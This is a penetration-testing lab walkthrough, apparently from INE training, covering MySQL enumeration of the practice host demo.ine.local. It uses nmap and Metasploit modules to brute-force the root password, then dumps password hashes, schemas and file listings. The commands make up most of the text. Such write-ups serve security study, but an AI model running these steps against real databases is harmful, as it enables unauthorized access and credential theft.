# MySQL Enumeration

1. Check if the target machine is reachable:
   ```
   ping -c 4 demo.ine.local
   ```
   ![image](https://github.com/user-attachments/assets/50e61342-4ea7-4e7a-987b-ce480d3d02cf)
   The target is reachable.

2. Run an nmap scan against the target:
   ```
   nmap demo.ine.local
   ```
   ![image](https://github.com/user-attachments/assets/254f59d7-72d8-4baa-9f6a-4820f7936855)
   MySQL service is running on the target.
   
3. Run the auxiliary/scanner/mysql/mysql_version module.
   ```
   msfconsole -q
   use auxiliary/scanner/mysql/mysql_version
   set RHOSTS demo.ine.local
   run
   ```
   ![image](https://github.com/user-attachments/assets/617f66eb-aef1-4194-8afc-42264bb3fd16)

4. Run the auxiliary/scanner/mysql/mysql_login module.
   ```
   use auxiliary/scanner/mysql/mysql_login
   set RHOSTS demo.ine.local
   set USERNAME root
   set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
   set VERBOSE false
   run
   ```
   ![image](https://github.com/user-attachments/assets/96f695ef-724f-4b50-beb1-2a9a4278ce74)

5. Run the auxiliary/admin/mysql/mysql_enum module.
   ```
   use auxiliary/admin/mysql/mysql_enum
   set USERNAME root
   set PASSWORD twinkle
   set RHOSTS demo.ine.local
   run
   ```
   ![image](https://github.com/user-attachments/assets/407b84e8-52ab-4180-8187-33213b922859)

6. Run the auxiliary/admin/mysql/mysql_sql module.
   ```
   use auxiliary/admin/mysql/mysql_sql
   set USERNAME root
   set PASSWORD twinkle
   set RHOSTS demo.ine.local
   run
   ```
   ![image](https://github.com/user-attachments/assets/b80b5404-c260-47f2-90cc-cc34f1dc6716)

7. Run the auxiliary/scanner/mysql/mysql_file_enum module.
   ```
   use auxiliary/scanner/mysql/mysql_file_enum
   set USERNAME root
   set PASSWORD twinkle
   set RHOSTS demo.ine.local
   set FILE_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
   set VERBOSE true
   run
   ```
   ![image](https://github.com/user-attachments/assets/eb1cf091-b35c-41b8-be4c-6507b27e0d61)

8. Run the auxiliary/scanner/mysql/mysql_hashdump module.
   ```
   use auxiliary/scanner/mysql/mysql_hashdump
   set USERNAME root
   set PASSWORD twinkle
   set RHOSTS demo.ine.local
   run
   ```
   ![image](https://github.com/user-attachments/assets/4db9d251-0240-446c-b495-8371b0c11b85)

9. Run the auxiliary/scanner/mysql/mysql_schemadump module.
   ```
   use auxiliary/scanner/mysql/mysql_schemadump
   set USERNAME root
   set PASSWORD twinkle
   set RHOSTS demo.ine.local
   run
   ```
   ![image](https://github.com/user-attachments/assets/6f795165-704a-45ed-87d6-7d76a7b3b9de)

10. Run the auxiliary/scanner/mysql/mysql_writable_dirs module.
    ```
    use auxiliary/scanner/mysql/mysql_writable_dirs
    set RHOSTS demo.ine.local
    set USERNAME root
    set PASSWORD twinkle
    set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
    run
    ```
    ![image](https://github.com/user-attachments/assets/7c005ba5-5cf8-4b7e-9669-b5c03511583d)









